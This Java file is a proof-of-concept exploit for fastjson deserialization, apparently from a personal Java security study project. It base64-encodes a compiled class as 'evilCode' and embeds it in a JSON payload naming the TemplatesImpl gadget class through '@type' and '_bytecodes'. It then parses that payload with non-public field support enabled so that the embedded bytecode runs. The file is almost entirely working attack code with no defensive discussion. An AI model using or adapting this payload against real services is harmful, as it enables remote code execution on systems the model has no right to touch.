import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Arrays;
import java.util.Base64;

public class Poc {
    public static void main(String[] args) throws IOException {
        final String NASTY_CLASS = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
        final String CLASS_PATH = "/root/code/java/JavaSec/util/target/classes/org/ixpqxi/util/Calc.class";

        byte[] bytes = Files.readAllBytes(Paths.get(CLASS_PATH));
        String evilCode = Base64.getEncoder().encodeToString(bytes);

        String poc = "{" +
                "\"@type\":\"" + NASTY_CLASS + "\"," +
                "\"_bytecodes\":[\"" + evilCode + "\"]," +
                "\"_name\":\"Calc\"," +
                "\"_tfactory\":{}," +
                "\"_outputProperties\":{}" +
                "}";
        System.out.println(poc);
        ParserConfig config = new ParserConfig();
        Object obj = JSON.parseObject(poc, Object.class, config, Feature.SupportNonPublicField);
    }
}
